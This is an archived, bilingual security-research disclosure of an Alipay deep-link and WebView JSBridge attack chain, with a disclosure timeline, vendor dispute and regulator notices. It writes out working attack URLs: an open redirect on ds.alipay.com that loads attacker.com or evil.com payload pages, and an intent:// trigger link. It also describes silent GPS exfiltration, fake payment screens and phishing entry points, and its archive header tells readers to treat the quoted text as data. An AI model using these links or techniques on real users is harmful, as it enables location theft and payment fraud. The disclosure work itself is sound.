---
type: Article
title: "Alipay SecurityGuard SDK: 36 CVEs, 146K Hot-Patch Hooks, Weak Crypto"
description: Maps an Alipay deep-link and privileged-WebView chain in which a whitelisted-domain redirect loads attacker-controlled content through an alipays route. Device testing shows that the resulting page can reach sensitive JSBridge interfaces for location, navigation and payment-related UI.
resource: "https://innora.ai/zfb/"
tags: [article, webseclist-reference, en, innora-ai-security-research, mobile-web, deep-link, open-redirect, webview, javascript-bridge, attack-chain, owasp-a04-2021]
generated:
  by: webseclist-refs/1
  at: "2026-10-02T04:46:44+00:00"
status: stable
stale_after: 2027-10-02
sources:
  - id: original
    resource: "https://innora.ai/zfb/"
    title: "Alipay SecurityGuard SDK: 36 CVEs, 146K Hot-Patch Hooks, Weak Crypto"
    author: Innora AI Security Research
    last_modified: 2026-03-11
also_at: []
authors:
  - Innora AI Security Research
canonical_url: ""
cited_by:
  - "2026-ai.md:58"
commit: ""
content_sha256: 10dacfa8ef4da8697367661f3a2347275bbb055914091c4d545e3cae79907025
depth: full
depth_reason: default
kind: article
language: en
licence: unknown
original_url: "https://innora.ai/zfb/"
published: 2026-03-11
publisher: Innora AI Security Research
publisher_english: ""
raw_sha256: 4a0873a3a8ed58a0d0fa54b68cc7faff0ae0565aaf73a780f7e955cf5e020e32
retrieved_from: "https://innora.ai/zfb/"
retrieved_kind: stored
retrieved_utc: "2026-10-02T04:46:44+00:00"
slug: 2026-innora-ai-security-research-alipay-securityguard-sdk-36-cves-146k-crypto
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Alipay SecurityGuard SDK: 36 CVEs, 146K Hot-Patch Hooks, Weak Crypto

**Alipay SecurityGuard SDK: 36 CVEs, 146K Hot-Patch Hooks, Weak Crypto** - Innora AI Security Research, Innora AI Security Research.

- Published: 2026-03-11
- Original: <https://innora.ai/zfb/>
- Preserved from: https://innora.ai/zfb/ (stored) on 2026-10-02
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

Alipay Security Research: 36 CVEs, SecurityGuard SDK Analysis | 支付宝安全研究

最后更新: 2026-03-25Last updated: 2026-03-25

 中文 EN

 独立安全研究 Independent Security Research

#  支付宝 DeepLink 攻击面分析 Alipay DeepLink Attack Surface Analysis

#  一个链接，通向一切 One Link to Rule Them All

 针对支付宝 Android/iOS 最新版的 DeepLink + WebView JSBridge 攻击链端到端分析。已通过负责任披露流程向蚂蚁集团报告，厂商回复为"正常功能"。 End-to-end analysis of the DeepLink + WebView JSBridge attack chain on Alipay Android/iOS latest versions. Reported through responsible disclosure to Ant Group. Vendor response: "normal functionality."

17

 已验证问题 Verified Issues

308

 服务器日志 Exfil Logs

3

 验证设备 Devices Tested

42

 证据截图 Screenshots

NEW 2026-03-17

##  🔬 独立安全研究：支付宝 SecurityGuard SDK 完整逆向 — 208个API拦截 · 97%接口无保护 🔬 Independent Research: Alipay SecurityGuard SDK Full Reverse Engineering — 208 API Intercepts · 97% Unprotected

我们对支付宝内置的 SecurityGuard 安全SDK进行了完整逆向工程分析，发现了远超支付安全需求的大规模数据采集行为：

208

API拦截类别

97%

接口无权限保护

22

行为监控事件

29

设备指纹项

📱

**DexAOP字节码拦截** — 976个代理类拦截蓝牙(17)、电话(17)、通讯录(12)、摄像头(5)、录音(9)、剪贴板(4)等几乎所有硬件能力

👁️

**行为监控** — 截屏、录屏、通话状态、剪贴板变化、蓝牙连接，每10条批量上报服务器

🔓

**396/408内部接口无保护** — 支付、数字人民币钱包、NFC、文件操作等97%接口没有权限检查

🛰️

**PatchProxy远程修改** — 服务器可远程修改TLS验证、权限检查、支付校验，无需用户同意

 [📄 阅读完整隐私分析报告](https://innora.ai/zfb/privacy-analysis.html) [⭐ GitHub 完整代码](https://github.com/sgInnora/alipay-securityguard-analysis)

Complete reverse engineering of Alipay's SecurityGuard SDK reveals massive data collection far beyond payment security requirements:

208

API Intercepts

97%

No Permission Check

22

Behavior Events

29

Fingerprint Items

📱

**DexAOP Bytecode Interception** — 976 proxy classes intercept Bluetooth(17), Telephony(17), Contacts(12), Camera(5), Audio(9), Clipboard(4)

👁️

**Behavior Monitoring** — Screenshot, screen recording, call state, clipboard changes — batched every 10 events

🔓

**396/408 Unprotected** — 97% of JSBridge APIs including payment, digital yuan wallet, NFC have zero permission checks

🛰️

**PatchProxy Remote Mod** — Server can remotely alter TLS validation, permissions, payment verification without consent

 [📄 Read Full Privacy Analysis](https://innora.ai/zfb/privacy-analysis.html) [⭐ GitHub Repository](https://github.com/sgInnora/alipay-securityguard-analysis)

##  🚨 审查通知：微信公众号文章已被全部强制删除 🚨 CENSORSHIP NOTICE: All WeChat Articles Forcibly Deleted

  **2026-03-15** — 我们在微信公众号 **AI-security-innora** 发布的 **4 篇安全研究文章全部被强制删除**。
 删除通知仅写：**"接相关投诉，违反《中华人民共和国网络安全法》"**。
 **注意：删除通知中未显示任何投诉方信息、未列明具体违规条款、未提供申诉机会。**这不是正常的投诉处理流程——正常流程会显示投诉方身份和具体主张并允许申诉。这是**跳过正常程序的直接暴力删除**。

 这是厂商应对安全研究的第四层手段：
 ① 口头否认（3/10 "正常功能"）→ ② 律师函（3/11 发布4小时后）→ ③ 服务器端封堵 PoC（3/15 白名单拦截）→ ④ 平台审查删除所有文章（3/15）

 **本页面 (innora.ai/zfb/) 部署在中国境外服务器，不受微信平台审查影响。研究内容完整保留。**
 **本服务器及研究者本人分属新加坡、新西兰、美国三地注册公司。如需通过法律途径删除本页面内容，需在三地法院分别完成完整法律程序。欢迎通过正当法律渠道沟通。**   **2026-03-15** — All **4 security research articles** published on our WeChat Official Account **AI-security-innora** have been **forcibly deleted**.
 The only reason given: **"Following a related complaint, violation of the Cybersecurity Law of the PRC."**
 **Note: The deletion notice identifies NO complainant, cites NO specific legal provision, and offers NO appeal process.** This is NOT a normal complaint procedure — standard process shows the complainant's identity and specific claims, and allows appeal. This is a **brute-force deletion bypassing normal procedures**.

 This represents the vendor's fourth layer of response to security research:
 ① Verbal denial (3/10 "normal functionality") → ② Lawyer's letter (3/11, 4hrs after disclosure) → ③ Server-side PoC blocking (3/15, whitelist filtering) → ④ Platform censorship of all articles (3/15)

 **This page (innora.ai/zfb/) is hosted outside mainland China and is not subject to WeChat censorship. All research content is preserved here.**
 **This server and the researcher are affiliated with companies registered in Singapore, New Zealand, and the United States. Any legal request to remove this content must complete full legal proceedings in all three jurisdictions. We welcome communication through proper legal channels.**

 被删除的 4 篇文章： 4 Deleted Articles:

 DELETED 当白名单绕过沦为全网攻击的钥匙，傲慢的终点是法庭与溯源调查When Whitelist Bypass Becomes the Master Key

 DELETED 巨头的"封口令"被微信驳回，全球顶级黑客弹药库给出最终裁决Tech Giant's "Gag Order" Rejected by WeChat

 DELETED 位置被秒偷！10多亿人每天在用的国民支付应用，17个「正常功能」细思极恐！Location Stolen Instantly! 17 "Normal Features"

 DELETED 支付宝安全研究遭律师函投诉 — 一篇零次提及"支付宝"的文章如何构成"商誉侵权"？Alipay Research Hit with Lawyer's Letter

 ![WeChat censorship notification 1](https://innora.ai/zfb/wechat_censored_1.jpeg)

微信平台删除通知 (1/2)WeChat deletion notice (1/2)

 ![WeChat censorship notification 2](https://innora.ai/zfb/wechat_censored_2.jpeg)

微信平台删除通知 (2/2)WeChat deletion notice (2/2)

##  ⚠️ 核心发现：白名单绕过 — 任何人无需任何权限即可远程利用 (CVSS 9.3) ⚠️ Key Finding: Whitelist Bypass — Remotely Exploitable by Anyone, No Permissions Required (CVSS 9.3)

🔑

**这是整个攻击链的钥匙。**支付宝使用域名白名单限制 WebView 中可加载的页面。但其自有域名 `ds.alipay.com` 存在开放重定向漏洞，允许攻击者通过白名单域名跳转加载任意恶意页面。**没有此绕过，其余漏洞仅限局域网；有了它，人人可远程利用。**

👤

**不需要任何开发者权限。**不需要注册支付宝开放平台、不需要小程序开发者资格、不需要任何审批。攻击者只需构造一条 URL，通过微信、WhatsApp、短信或任何即时通讯工具发送给受害者。

💣

**17个漏洞因此从"理论"变为"实战"。**攻击者页面一旦加载到支付宝 WebView 中，即获得完整的 JSBridge API 访问权限——**静默窃取 GPS 坐标、调用支付接口、打开相机、伪造 UI**——全部通过一条链接完成。

💬

**厂商自己承认严重性。**蚂蚁集团安全团队在与我们的通话中明确表示：*"如果能绕过我们的白名单限制，那就严重了"*。通话结束后不到 2 分钟，白名单即被绕过。**厂商确认了严重性，但至今拒绝修复，称其为"正常功能"。**

// 任何人都可以构造的攻击链接：

 https://ds.alipay.com/?scheme=alipays://platformapi/startapp?appId=20000067&url=https://attacker.com/payload.html

🔑

**This is the master key to the entire attack chain.** Alipay uses a domain whitelist to restrict pages loadable in its WebView. However, its own domain `ds.alipay.com` has an open redirect vulnerability, allowing attackers to load arbitrary malicious pages through the whitelisted domain. **Without this bypass, other vulnerabilities are LAN-only; with it, anyone can attack remotely.**

👤

**No developer permissions required.** No Alipay Open Platform registration, no Mini Program developer credentials, no approval process. An attacker simply crafts a URL and sends it via WeChat, WhatsApp, SMS, or any messaging app.

💣

**17 vulnerabilities go from "theoretical" to "in-the-wild."** Once the attacker's page loads inside Alipay's WebView, it gains full JSBridge API access — **silently steal GPS coordinates, invoke payment interfaces, access the camera, spoof UI elements** — all through a single link.

💬

**The vendor acknowledged the severity.** Ant Group's security team stated during our call: *"If you can bypass our whitelist, that would be serious."* Less than 2 minutes after the call ended, the whitelist was bypassed. **The vendor confirmed it was serious, yet still refuses to patch, calling it "normal functionality."**

// Attack URL anyone can construct:

 https://ds.alipay.com/?scheme=alipays://platformapi/startapp?appId=20000067&url=https://attacker.com/payload.html

|   项目Field  |   值Value  |   |
| **Target** | com.eg.android.AlipayGphone v10.8.26.7000 / v10.8.30.8000 |  |
| **APK Size** | 210.5 MB (220,503,494 bytes) |  |
| **Platform** | Android 16 (API 36) + iOS 26.3.1 |  |
|  ** 分析日期Analysis Date ** |  2026-02-16 ~ 2026-03-07 |   |
|  ** 攻击前提Prerequisites ** |   非Root、非越狱、无特殊权限、仅需受害者点击一个链接 No root, no jailbreak, no special permissions. Victim only needs to click one link.  |   |
|  ** 研究者Researcher ** |  Innora AI Security Research ([[email protected]](https://innora.ai/cdn-cgi/l/email-protection)) |   |

###  目录Table of Contents

-  披露时间线Disclosure Timeline
-  核心发现摘要Executive Summary
-  攻击链详解Attack Chain Details
-  在线 PoC 演示Live PoC Demonstration
-  已验证安全问题Verified Security Issues
-  证据展示Evidence
-  跨平台验证Cross-Platform Verification
-  iOS 特有风险iOS-Specific Risks
-  已生效的防护Working Defenses
-  厂商回应与讨论Vendor Response & Discussion
-  修复建议Remediation Recommendations
-  用户自我保护User Self-Protection
-  社区质疑回应Community Questions & Responses
-  全球监管机构响应Global Regulatory Response
-  法律回应Legal Response

## 01 负责任披露时间线 Responsible Disclosure Timeline

我们始终遵循负责任的安全研究原则。在公开任何信息之前，已通过多个渠道向蚂蚁集团进行了完整的报告。

We followed responsible disclosure principles throughout. Before any public discussion, full reports were submitted to Ant Group through multiple channels.

2026-02-16

 开始对 Alipay v10.8.30.8000 APK 进行静态分析 Started static analysis of Alipay v10.8.30.8000 APK

2026-02-25

 **第一次报告** — TLS/SSL 中间人攻击 + 设备指纹问题，通过厂商安全应急响应中心(SRC)提交
*注：此次报告的是 TLS/SSL 相关问题，DeepLink/JSBridge 攻击链尚未发现* **First Report** — TLS/SSL MITM + device fingerprinting issues submitted via vendor's Security Response Center (SRC)
*Note: This report covered TLS/SSL issues only; the DeepLink/JSBridge attack chain had not yet been discovered*

2026-03-06

 **AntSRC 回复**："经过我们安全工程师审核，无法被实际利用" **AntSRC Reply**: "After review by our security engineers, [the issues] cannot be practically exploited"

2026-03-07 04:08

 **第二次报告** — 发现 DeepLink+JSBridge 攻击链，提交 8 个漏洞（2 CRITICAL + 4 HIGH），发送至厂商安全团队对接人 **Second Report** — DeepLink+JSBridge attack chain discovered, 8 issues (2 CRITICAL + 4 HIGH) sent to vendor security contact

2026-03-07 06:07

 **第三次报告（V3）** — 扩展至 17 个漏洞，含资金操作风险 + 308 条服务器日志 + 42 张截图 **Third Report (V3)** — Expanded to 17 issues including financial operation risks + 308 server logs + 42 screenshots

2026-03-07 07:54

 **第四次报告** — 端到端外部攻击完整演示，3 台设备跨国验证（新西兰/马来西亚/中国），含在线复现链接 **Fourth Report** — Full E2E external attack demo, 3 devices cross-country verification (NZ/MY/CN), with live reproduction URL

2026-03-07 12:33

 **厂商回复**："漏洞报告邮件已收到，我们会安排人尽快分析，完了给你回复" **Vendor Reply**: "Vulnerability report emails received, we will arrange someone to analyze ASAP and reply"

2026-03-07 14:25

 **微信语音通话（15分46秒）** — 厂商安全业务负责人在通话中辩称"局域网内本来就对这些功能开放"，试图将攻击面限定为局域网场景。并暗示：**"如果能绕过我们的白名单限制，那就严重了"**。此前所有测试确实在局域网环境下（研究员本机与测试手机 Xiaomi Redmi 12 在同一 WiFi 网络），PoC 页面部署在 192.168.80.12:8888 **WeChat Voice Call (15m 46s)** — Vendor security lead argued that "these features are designed to be open within LAN" and attempted to frame the attack surface as LAN-only. The lead implied: **"If you can bypass our whitelist, that would be serious."** All prior testing had indeed been on a local network (researcher's machine and Xiaomi Redmi 12 test phone on the same WiFi), with PoC pages hosted at 192.168.80.12:8888

2026-03-07 14:36

 **白名单绕过 — 2 分钟内完成** — 通话结束后不到 2 分钟，我们即绕过了厂商自以为安全的白名单机制。绕过方法：利用 `ds.alipay.com/?scheme=` 开放重定向参数。该域名 (ds.alipay.com) 本身在 Alipay WebView 的白名单中，其 `?scheme=` 参数接受任意 URL 跳转，攻击者可构造 `https://ds.alipay.com/?scheme=alipays://platformapi/startapp?appId=20000067&url=https://evil.com/payload.html`，URL 的 host 为白名单域名，但实际加载攻击者页面。**这彻底否定了"局域网限定"的辩解**——任何互联网上的页面都可以通过白名单域名跳转进入 Alipay WebView 并调用 JSBridge API **Whitelist Bypass — Completed in Under 2 Minutes** — Less than 2 minutes after the call ended, we bypassed the vendor's whitelist mechanism they believed was secure. Method: exploiting the `ds.alipay.com/?scheme=` open redirect parameter. The domain ds.alipay.com is itself whitelisted in Alipay's WebView, and its `?scheme=` parameter accepts arbitrary URL redirects. An attacker can craft `https://ds.alipay.com/?scheme=alipays://platformapi/startapp?appId=20000067&url=https://evil.com/payload.html` — the URL host is a whitelisted domain, but it actually loads the attacker's page. **This completely invalidated the "LAN-only" defense** — any page on the internet can use the whitelisted domain redirect to enter Alipay's WebView and invoke JSBridge APIs

2026-03-07 15:01

 **公网 PoC 部署 + 第二次语音通话（7分07秒）** — 将 PoC 部署至公网 `https://innora.ai/sec/trigger.html`（触发页）和 `https://innora.ai/sec/verify.html`（载荷页），发送给厂商安全人员验证。证明攻击在互联网环境下完全可行，不限于局域网 **Public PoC Deployment + Second Voice Call (7m 07s)** — Deployed PoC to public internet at `https://innora.ai/sec/trigger.html` (trigger page) and `https://innora.ai/sec/verify.html` (payload page), sent to vendor security lead for verification. Proved the attack is fully viable over the internet, not limited to LAN

2026-03-07 15:09

 **厂商安全人员亲测 — iPhone 从杭州连接** — 服务器日志显示来自杭州（支付宝总部所在地）的 iPhone 17 Pro Max 连接，GPS 定位 (30.3xxx, 120.1xxx) 精度 9.99m。设备有 2xxGB 存储、80% 电量。**关键发现：iOS 上有 18 个 JSBridge API 可用，比 Android (13 个) 多出 5 个高危 API：tradePay、share、getLocation、scan、chooseImage**。iOS 版 tradePay（支付）和 getLocation（定位）均可从外部页面直接调用，而 Android 上这些 API 被拦截。这意味着 **iOS 攻击面显著大于 Android**，且 share API 可实现蠕虫式传播 **Vendor Security Lead Tests — iPhone Connects from Hangzhou** — Server logs show iPhone 17 Pro Max connecting from Hangzhou (Alipay HQ city), GPS (30.3xxx, 120.1xxx) accuracy 9.99m. Device: 2xxGB storage, 80% battery. **Critical discovery: 18 JSBridge APIs available on iOS vs 13 on Android — 5 additional high-risk APIs: tradePay, share, getLocation, scan, chooseImage**. iOS tradePay (payment) and getLocation (GPS) can be invoked from external pages, while Android blocks them. This means **iOS attack surface is significantly larger than Android**, and the share API enables worm-like propagation

2026-03-07 15:28–17:03

 **V6 PoC + 多设备验证** — 创建针对高影响力漏洞的 V6 版 PoC：(1) 静默 GPS+设备指纹窃取 (2) 支付引导攻击 (3) UI 钓鱼 (4) 敏感页面跳转链 (5) share API 蠕虫传播（iOS）。测试账户因频繁触发风控被封锁，委托新西兰朋友测试——正常触发。随后用妻子的 iPhone 验证——同样成功。厂商回复"OK，我们分析下" **V6 PoC + Multi-device Verification** — Created V6 PoC targeting high-impact vulns: (1) silent GPS+device fingerprint theft (2) payment redirection attack (3) phishing UI (4) sensitive page redirect chains (5) share API worm propagation (iOS). Test account banned due to risk control triggers; delegated to friend in New Zealand — triggered successfully. Then verified with spouse's iPhone — also successful. Vendor replied "OK, let us analyze"

2026-03-08

 **厂商第二轮验证** — 安全业务负责人在杭州使用 iPhone 16 Pro 进行更深入测试。全程无任何 GPS 授权声明/弹窗，页面加载到 GPS 数据回传仅约 7 秒。3 轮测试精度从 17.4m 递进至 9.99m 再到 8.81m，`locationReducedAccuracy: 0`（精确定位模式）。此轮测试进一步确认了前日发现的 iOS 攻击面问题，且证实 GPS 外泄在用户完全无感知的情况下发生 **Vendor Second-round Verification** — Security business lead conducted deeper testing in Hangzhou with iPhone 16 Pro. Zero GPS authorization dialogs appeared throughout; GPS data transmitted within ~7 seconds of page load. 3-round accuracy improved from 17.4m to 9.99m to 8.81m, with `locationReducedAccuracy: 0` (precise mode). This round further confirmed the iOS attack surface discovered the previous day, and verified GPS exfiltration occurs with zero user awareness

2026-03-09

 测试账户被封锁（安全测试期间触发风控），发送账户解封申请 Test account banned (risk control triggered during testing). Account unblock request sent.

2026-03-10

 **厂商最终回复**："根据我们的评估，这些属于正常功能" **Vendor Final Response**: "Based on our assessment, these are normal functionality"

2026-03-11 ~18:03

 **微信对话**（截图泰国时间17:03，+1h=北京时间）— 厂商对接人确认"正常功能"定性（回复"嗯"），我方告知将公开讨论。对接人在对话中使用了"洞"一词，说明内部对发现的安全属性并非毫无认知 **WeChat Conversation** (screenshot in Thai timezone 17:03, +1h = Beijing time) — Vendor contact confirmed "normal functionality" classification. We notified intent to publish. The contact used the colloquial term "洞" (vulnerability) in conversation, suggesting internal awareness of the security nature of these findings

2026-03-11 18:16

 **公开发布** — 厂商明确拒绝修复后，公开研究成果 **Public Disclosure** — After vendor explicitly refused to fix, research published

2026-03-11 22:45

 **法律投诉** — 文章发布仅4小时后，北京格韵律师事务所（代理厂商）向微信公众平台投诉我们的文章"内容侵犯名誉/商誉/隐私/肖像"。讽刺的是：**我们的文章从头到尾未出现"支付宝""Alipay""蚂蚁集团"中的任何一个词**。投诉方通过发起投诉，反而自行确认了文章描述的行为与其所代理的企业相关。我们已提交申诉。 **Legal Complaint ** — Just 4 hours after publication, Beijing Geyun Law Firm (representing the vendor) filed a "content infringing reputation/goodwill/privacy/likeness" complaint against our WeChat article. The irony: **our article never once mentions "Alipay," "支付宝," or "Ant Group" anywhere in the entire text**. By filing this complaint, the complainant effectively self-identified their client as the subject of the article. We have filed an appeal.

2026-03-12

 **CVE 提交（6个漏洞，等待确认中）** — 鉴于厂商（阿里巴巴作为注册CNA，编号CNA-2017-0006）拒绝承认漏洞并拒绝分配CVE编号，我们通过 MITRE CNA of Last Resort (CNA-LR) 路径分两批提交了6个独立CVE申请：
 **第一批（5个）：**
 ① DeepLink URL Scheme 访问控制绕过 (CWE-939, CVSS 9.1)
 ② iOS GPS 静默外泄 — 无授权弹窗 (CWE-359, CVSS 7.4)
 ③ iOS tradePay 未授权支付流程调用 (CWE-940, CVSS 8.6)
 ④ UI 欺骗 — showToast/setTitle 伪造支付宝界面 (CWE-451, CVSS 8.1)
 ⑤ 端到端敏感数据外泄 — 设备指纹+权限状态 (CWE-200, CVSS 8.6)
 **第二批（1个）：**
 ⑥ ds.alipay.com 开放重定向绕过白名单机制 (CWE-601+CWE-939, CVSS 9.3) — 利用白名单域名 ds.alipay.com 的 `?scheme=` 参数实现开放重定向，彻底绕过厂商域名白名单防护，使任何互联网页面均可通过白名单域名跳转链进入 WebView 调用全部 JSBridge API。此绕过在与厂商安全团队通话期间 2 分钟内完成
 Credit: Jiqiang Feng (Innora AI Security Research)。等待 MITRE 回复确认中。 **CVE Submission (6 Vulnerabilities, Awaiting Confirmation)** — Since the vendor (Alibaba, a registered CNA: CNA-2017-0006) refused to acknowledge the vulnerabilities and declined to assign CVE IDs, we submitted 6 independent CVE requests in two batches through MITRE's CNA of Last Resort (CNA-LR) pathway:
 **Batch 1 (5 CVEs):**
 ① DeepLink URL Scheme Access Control Bypass (CWE-939, CVSS 9.1)
 ② iOS Silent GPS Exfiltration — No Authorization Prompt (CWE-359, CVSS 7.4)
 ③ iOS tradePay Unauthorized Payment Flow Invocation (CWE-940, CVSS 8.6)
 ④ UI Spoofing — showToast/setTitle Fake Alipay Interface (CWE-451, CVSS 8.1)
 ⑤ End-to-End Sensitive Data Exfiltration — Device Fingerprint + Permission States (CWE-200, CVSS 8.6)
 **Batch 2 (1 CVE):**
 ⑥ ds.alipay.com Open Redirect Whitelist Bypass (CWE-601+CWE-939, CVSS 9.3) — Exploits the `?scheme=` parameter on whitelisted domain ds.alipay.com to perform an open redirect, completely bypassing the vendor's domain whitelist protection. Any internet-hosted page can chain through the whitelisted domain to enter WebView and invoke all JSBridge APIs. This bypass was achieved in under 2 minutes during a live call with the vendor security team
 Credit: Jiqiang Feng (Innora AI Security Research). Awaiting MITRE confirmation.

2026-03-12

 **全球通知** — 向 23 个金融监管机构、13 个国家 CERT、14 家竞争对手安全团队、50+ 家国际媒体发送漏洞披露通知 **Global Notification** — Vulnerability disclosure sent to 23 financial regulators, 13 national CERTs, 14 competitor security teams, and 50+ international media outlets

2026-03-12

 **新加坡 PDPC 正式立案调查** — 新加坡个人数据保护委员会 (PDPC) 回复确认已开启正式调查 **Singapore PDPC Formal Investigation** — Singapore's Personal Data Protection Commission confirmed opening a formal investigation

2026-03-12

 **Google Play 启动调查** — 向 Google Play 提交正式政策违规举报（违反用户数据政策、权限政策、欺骗行为政策），Google 确认收到并回复："We will investigate and take appropriate action" **Google Play Investigation** — Formal policy violation report submitted to Google Play (User Data, Permissions, Deceptive Behavior policies). Google confirmed: "We will investigate and take appropriate action"

2026-03-12

 **Apple Product Security 启动调查** — Apple 产品安全团队人工回复（Brent），确认已将报告转发给相关调查团队。Apple 正在调查 Alipay iOS 端 JSBridge 暴露的 tradePay（支付）、scan（扫码）、chooseImage（相机）等高危 API **Apple Product Security Investigation** — Apple Product Security responded (Brent): "Your report was forwarded along to the appropriate team for investigation." Apple is investigating Alipay iOS JSBridge exposure of tradePay, scan, chooseImage APIs

2026-03-12

 **Packet Storm Security 公开收录** — 漏洞通告被 Packet Storm Security（全球知名漏洞数据库）正式收录并发布：
[https://packetstorm.news/files/id/217089](https://packetstorm.news/files/id/217089)
标题："Alipay Open Redirect / API Attacker Payload Insertion" **Packet Storm Security Publication** — Advisory officially published on Packet Storm Security (major global vulnerability database):
[https://packetstorm.news/files/id/217089](https://packetstorm.news/files/id/217089)
Title: "Alipay Open Redirect / API Attacker Payload Insertion"

2026-03-12

 **HKCERT → CNCERT** — 香港计算机应急协调中心 (HKCERT) 确认已将报告转交中国国家网络安全应急响应中心 (CNCERT) **HKCERT → CNCERT** — Hong Kong CERT confirmed forwarding the report to China National CERT (CNCERT)

2026-03-12

 **荷兰央行 (DNB) 正式回复** — 指出 CSSF 卢森堡为 Alipay 欧洲的主要监管机构，提供 GDPR 第32条（处理安全性）违规执法路径。CERT-Luxembourg (CIRCL) 事件处理分析师 a CIRCL incident handler 确认将寻找 Alipay 欧洲实体联系人转发报告 **DNB Netherlands Formal Response** — Identified CSSF Luxembourg as Alipay Europe's Primary Supervisory Authority, provided GDPR Article 32 enforcement pathway. CERT-Luxembourg (CIRCL) incident handler a CIRCL incident handler confirmed locating appropriate Alipay European entity contact to forward the report

2026-03-15

 **CERT Polska 正式受理** — 波兰国家CERT已受理事件，开始按程序处理，分配Ticket #554****57 **CERT Polska Accepted** — Poland national CERT accepted the case, began incident handling procedures, Ticket #554****57

2026-03-15

 **PCPD 香港个人资料私隐专员公署** — 确认收到报告，将跟进并回复 **PCPD Hong Kong Privacy Commissioner** — Confirmed receipt, will follow up and respond

2026-03-15

 **AZOP 克罗地亚个人数据保护局** — 已收到报告，正在处理 **AZOP Croatia Data Protection Agency** — Report received, being processed

2026-03-16

 **SingCERT/CSA 新加坡网络安全局** — 确认收到漏洞报告，建议跟进MITRE CVE分配 **SingCERT/CSA Singapore** — Confirmed receipt of vulnerability report, advised to follow up with MITRE on CVE assignment

2026-03-16

 **HKMA 香港金管局正式转交** — 投诉已正式转交 Alipay Financial Services (HK) Limited 跟进处理，HKMA将监督持牌机构处理并在必要时采取行动 **HKMA Formal Referral** — Complaint formally referred to Alipay Financial Services (HK) Limited for follow-up. HKMA will monitor licensee handling and take appropriate actions as necessary

2026-03-16

 **DPC 爱尔兰数据保护委员会** — 立案 DPC032****957，因管辖权问题建议联系当地DPA **DPC Ireland** — Case DPC032****957 opened, referred to local DPA due to jurisdiction

2026-03-16

 **ANSSI/CERT-FR 法国** — 正式回复：该应用在法国用户较少，不采取进一步行动 **ANSSI/CERT-FR France** — Formal response: app has limited French user base, no further action planned

2026-03-17

 **AP 荷兰数据保护局** — 正式受理GDPR投诉 **Dutch DPA (Autoriteit Persoonsgegevens)** — Formally received GDPR complaint

2026-03-17

 **FCA 英国金融行为监管局** — 参考号 2121****43，信息已记录并用于监管工作 **FCA UK** — Reference 2121****43, information recorded and used in supervisory work with authorised firms

2026-03-17

 **DNB 荷兰央行** — 确认邮件已受理处理中 **DNB Netherlands Central Bank** — Email received and being processed

2026-03-17

 **新增CVE提交** — 针对支付宝应用新发现的安全问题，已向MITRE提交额外CVE申请（详情暂不公开） **Additional CVE Submission** — New CVE application submitted to MITRE for additional security issues discovered in the Alipay application (details withheld pending assignment)

## 02 核心发现摘要 Executive Summary

支付宝的 `alipays://` DeepLink scheme 允许任何第三方应用或网页将用户引导到支付宝的 Nebula WebView 容器，加载**攻击者控制的外部网页**。一旦加载，攻击者的 JavaScript 代码可以调用 `AlipayJSBridge` API，执行一系列危险操作：

- **窃取精确GPS定位** — 在用户已授予支付宝位置权限的前提下，外部页面调用getLocation无任何二次确认弹窗，坐标直接回传攻击者服务器
- **窃取完整设备指纹** — 品牌/型号/OS/存储/电量/蓝牙/WiFi/权限状态 30+ 字段
- **打开转账页面并预填攻击者收款账号和金额**（最终确认仍需用户点击，但配合UI欺骗可大幅降低警惕性）
- **触发支付SDK弹出支付界面** — tradePay API 唤起收银台（用户仍需手动确认，但UI可被高度仿真）
- **跳转18个敏感内部页面** — 交易记录、银行卡管理、芝麻信用、提现、亲情号等
- **显示虚假转账通知** — 在支付宝内伪造 "转账 ¥5,000 到 张*明 成功"
- **篡改标题栏为"安全中心"** — 增强钓鱼可信度
- **跳转到支付宝登录页面** — 创建完美的凭据钓鱼入口
- **链式加载更多恶意页面** — 每个新页面都可再次调用全部 API

攻击条件极低：**受害者只需点击一个链接**。无需Root、无需越狱、无需安装任何应用。链接可通过短信、微信、QQ、邮件、二维码等任何渠道传播。

Alipay's `alipays://` DeepLink scheme allows any third-party app or webpage to direct users into Alipay's Nebula WebView container, loading **attacker-controlled external web pages**. Once loaded, the attacker's JavaScript can call `AlipayJSBridge` APIs to perform dangerous operations:

- **Steal precise GPS location** — When location permission is already granted to Alipay, external pages calling getLocation get coordinates with no secondary consent dialog, sent directly to attacker server
- **Steal complete device fingerprint** — Brand/model/OS/storage/battery/Bluetooth/WiFi/permissions, 30+ fields
- **Open transfer page with pre-filled attacker account and amount** (final confirmation still requires user tap, but combined with UI spoofing can greatly reduce vigilance)
- **Trigger payment SDK to launch payment UI** — tradePay API invokes cashier (user must still confirm, but UI can be highly spoofed)
- **Navigate to 18 sensitive internal pages** — Transaction history, bank cards, credit score, withdrawal, family accounts, etc.
- **Display fake transfer notifications** — Forge "Transfer CNY 5,000 to Zhang*Ming completed" inside Alipay
- **Spoof title bar to "Security Center"** — Enhance phishing credibility
- **Redirect to Alipay login page** — Create perfect credential phishing entry point
- **Chain-load more malicious pages** — Each new page can call all APIs again

Attack prerequisites are minimal: **victim only needs to click one link**. No root, no jailbreak, no app installation required. The link can be distributed via SMS, WeChat, QQ, email, QR codes, or any other channel.

## 03 攻击链详解 Attack Chain Details

###  攻击链 A: 网页链接 → WebView → JSBridge → 数据窃取 + 转账劫持 Chain A: Web Link → WebView → JSBridge → Data Theft + Transfer Hijacking

1

 ** 攻击者部署恶意页面 Attacker deploys malicious page **

 在任何公网 HTTPS 服务器上部署 PoC 页面（如 `https://innora.ai/zfb/poc/verify.html`）和数据收集端点 Deploy PoC page (e.g., `https://innora.ai/zfb/poc/verify.html`) and data collection endpoint on any public HTTPS server

2

 ** 发送钓鱼链接给受害者 Send phishing link to victim **

 通过短信/微信/QQ等发送链接。受害者在手机浏览器中点击后，看到"恭喜获得88元红包"等社工页面 Send link via SMS/WeChat/QQ. Victim clicks in mobile browser, sees social engineering page like "Congratulations! You won a ¥88 red packet"

Trigger URL

 `intent://platformapi/startapp?appId=20000067&url=https%3A%2F%2Finnora.ai%2Fzfb%2Fpoc%2Fverify.html#Intent;scheme=alipays;package=com.eg.android.AlipayGphone;end`

3

 ** 支付宝 WebView 加载外部页面 Alipay WebView loads external page **

